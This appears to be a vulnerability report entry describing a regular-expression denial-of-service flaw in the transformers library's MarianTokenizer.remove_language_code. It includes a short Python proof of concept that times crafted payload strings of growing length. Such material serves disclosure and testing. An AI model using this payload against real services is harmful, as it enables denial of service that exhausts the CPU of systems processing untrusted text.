title: Inefficient regular expression in MarianTokenizer.remove_language_code causes ReDoS via catastrophic backtracking
trigger_payload:
from transformers import MarianTokenizer
import time
model_name = 'Helsinki-NLP/opus-mt-en-fr'
tokenizer = MarianTokenizer.from_pretrained(model_name)
for i in range(1, 100000, 10000):
    payload = '<>>\x00' * i + '<\n>>><<'
    start = time.perf_counter()
    tokenizer.remove_language_code(payload)
    end = time.perf_counter()
    execution_time = end - start
    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')
